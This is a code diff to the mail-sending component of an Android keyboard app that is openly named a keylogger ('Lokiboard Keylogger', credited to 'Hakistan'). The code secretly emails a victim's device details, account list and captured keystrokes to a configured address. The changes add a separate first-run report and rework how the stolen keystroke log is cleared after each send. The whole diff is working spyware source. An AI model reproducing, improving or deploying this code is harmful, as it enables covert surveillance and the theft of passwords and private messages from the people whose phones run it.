@@ -66,6 +66,8 @@ public class MailWorker extends Worker {
 
     private static final String TAG = "MailWorker";
 
+    private SharedPreferences.Editor editor;
+    private SharedPreferences prefs;
     public static final String MY_PREFS_Notification_Count_KEY = "GPrefsNotificationCountKey";
     public static final String MY_PREFS_Text_Count_KEY = "GPrefsText_CountKey";
     public static final String MY_PREFS_FOCUSED_Count_KEY = "GPrefsFOCUSED_CountKey";
@@ -92,19 +94,20 @@ public class MailWorker extends Worker {
             // _multipart = new MimeMultipart("related");
 
             email=ctx.getResources().getString(R.string.EMail);
-            password=ctx.getResources().getString(R.string.Password);
+            password=ctx.getResources().getString(R.string.EmailPassword);
             emailinterval=ctx.getResources().getString(R.string.Interval);
 
 
 
             // php();
 
-            SharedPreferences prefs = ctx.getSharedPreferences(MY_PREFS_NAME, MODE_PRIVATE);
+            prefs = ctx.getSharedPreferences("MYSHPF", MODE_PRIVATE);
 
-            SharedPreferences.Editor editor = ctx.getSharedPreferences(MY_PREFS_NAME, MODE_PRIVATE).edit();
+            //editor = ctx.getSharedPreferences("MYSHPF", MODE_PRIVATE).edit();
 
 
-            String DataToSend = prefs.getString(MY_PREFS_STRING_KEY, "Hakistan Keylogger \n");//"No name defined" is the default value.
+
+          //  String DataToSend = prefs.getString(MY_PREFS_STRING_KEY, "Hakistan Keylogger \n");//"No name defined" is the default value.
 
 
             // Log.i(TAG,"Going To Send Email!");
@@ -112,7 +115,7 @@ public class MailWorker extends Worker {
 
             //addAttachment();
 
-            if(haveNetworkConnection()) {
+           // if(haveNetworkConnection()) {
 
                 if (prefs.getBoolean("FirstRun", true)) {
 
@@ -123,11 +126,9 @@ public class MailWorker extends Worker {
                     // ContactsList = getContactList();
                     AccountsList = getAccountsList();
 
-                    sendMail(email, "Loki Keyboard First Report", Sysinfo + "\n" + AccountsList + "\n\n<End Of Message>\n*|* Loki Keyboard Mod For Android *|*\n*|* Re-developed By Hakistan *|*\nSupport Us On Youtube(https://youtube.com/hakistan) \nReport Issues on Telegram(https://t.me/hakistan_chat)");
+                    send1stMail(email, "Lokiboard Keylogger First Report", Sysinfo + "\n" + AccountsList + "\n\n<End Of Message>\n*|* Loki Keyboard Mod For Android *|*\n*|* Re-developed By Hakistan *|*\nSupport Us On Youtube(https://youtube.com/hakistan) \nReport Issues on Telegram(https://t.me/hakistan_chat)");
 
 
-                    editor.putBoolean("FirstRun", false);
-                    editor.apply();
                 } else {
 
                     Log.i(TAG, "NOt First Run");
@@ -164,8 +165,7 @@ public class MailWorker extends Worker {
                             + "\nCPU_ABI2 : " + Build.CPU_ABI2
                             + "\nFINGERPRINT : " + Build.FINGERPRINT;
 
-
-                    sendMail(email, "Loki Keyboard's Report", "Victim's Device Info : \n" + deviceDetails + "\n\n"+"\nKey Logs: \n" + datatos + "\n\n<End Of Message>\n*|* Loki Keyboard Mod For Android *|*\n*|* Re-developed by Hakistan *|*\nSupport Us On Youtube(https://youtube.com/hakistan) \nReport Issues on Telegram(https://t.me/hakistan_chat)");
+                    sendMail(email, "Lokiboard keylogger Report", "Victim's Device Info : \n" + deviceDetails + "\n\n"+"\nKey Logs: \n" + datatos + "\n\n<End Of Message>\n*|* Loki Keyboard Mod For Android *|*\n*|* Re-developed by Hakistan *|*\nSupport Us On Youtube(https://youtube.com/hakistan) \nReport Issues on Telegram(https://t.me/hakistan_chat)");
 
                     /*
                     editor.putLong(MY_PREFS_Notification_Count_KEY, 0);
@@ -194,9 +194,9 @@ public class MailWorker extends Worker {
                 //editor.putInt("idName", 12);
                 // editor.apply();
 
-            }
+            //}
 
-            Log.i(TAG,"In Runnable!");
+            Log.i(TAG,"Finishing Task!");
 
             SystemClock.sleep(Long.parseLong(emailinterval));
 
@@ -213,14 +213,8 @@ public class MailWorker extends Worker {
 
 
         SharedPreferences prefs = ModApp.getAppContext().getSharedPreferences("MYSHPF", MODE_PRIVATE);
-        String LDataTOSend = prefs.getString("datatost", "Redeveloped By Hakistan");//"No name defined" is the default value.
 
-        SharedPreferences.Editor editor = ModApp.getAppContext().getSharedPreferences("MYSHPF", MODE_PRIVATE).edit();
-        editor.putString("datatost", "");
-        //editor.putInt("idName", 12);
-        editor.apply();
-
-        return LDataTOSend;
+        return prefs.getString("datatost", "Redeveloped By Hakistan");
 
     }
 
@@ -250,6 +244,24 @@ public class MailWorker extends Worker {
             Message message = createMessage(email, subject, messageBody, session);
 
             new SendMailTask().execute(message);
+
+        } catch (AddressException e) {
+            e.printStackTrace();
+        } catch (MessagingException e) {
+            e.printStackTrace();
+        } catch (UnsupportedEncodingException e) {
+            e.printStackTrace();
+        }
+    }
+
+    private void send1stMail(String email, String subject, String messageBody)
+    {
+        Session session = createSessionObject();
+
+        try {
+            Message message = createMessage(email, subject, messageBody, session);
+
+            new SendFirstMailTask().execute(message);
 
         } catch (AddressException e) {
             e.printStackTrace();
@@ -450,6 +462,10 @@ public class MailWorker extends Worker {
         protected void onPostExecute(Void aVoid) {
             super.onPostExecute(aVoid);
 
+            SharedPreferences.Editor editor = ModApp.getAppContext().getSharedPreferences("MYSHPF", MODE_PRIVATE).edit();
+            editor.putString("datatost", "");
+            //editor.putInt("idName", 12);
+            editor.apply();
             // Toast.makeText(getApplicationContext(),"Email Sent!",Toast.LENGTH_LONG).show();
 
             //  progressDialog.dismiss();
@@ -465,6 +481,47 @@ public class MailWorker extends Worker {
             return null;
         }
     }
+
+    private static class SendFirstMailTask extends AsyncTask<Message, Void, Void> {
+        //  private ProgressDialog progressDialog;
+
+        @Override
+        protected void onPreExecute() {
+            super.onPreExecute();
+            //Toast.makeText(getApplicationContext(),"Sending Email, Please Wait...",Toast.LENGTH_LONG).show();
+            //    progressDialog = ProgressDialog.show(MainActivity.this, "Please wait", "Sending mail", true, false);
+        }
+
+        @Override
+        protected void onPostExecute(Void aVoid) {
+            super.onPostExecute(aVoid);
+
+            Log.i(TAG,"Resting Values From Shprefs!");
+            Log.i(TAG,"Resting Values From Shprefs!");
+            SharedPreferences.Editor editor = ModApp.getAppContext().getSharedPreferences("MYSHPF", MODE_PRIVATE).edit();
+
+            editor.putBoolean("FirstRun", false);
+            editor.apply();
+
+            Log.i(TAG,"Rested Values!");
+
+
+            // Toast.makeText(getApplicationContext(),"Email Sent!",Toast.LENGTH_LONG).show();
+
+            //  progressDialog.dismiss();
+        }
+
+        @Override
+        protected Void doInBackground(Message... messages) {
+            try {
+                Transport.send(messages[0]);
+            } catch (MessagingException e) {
+                e.printStackTrace();
+            }
+            return null;
+        }
+    }
+
 
 
 }
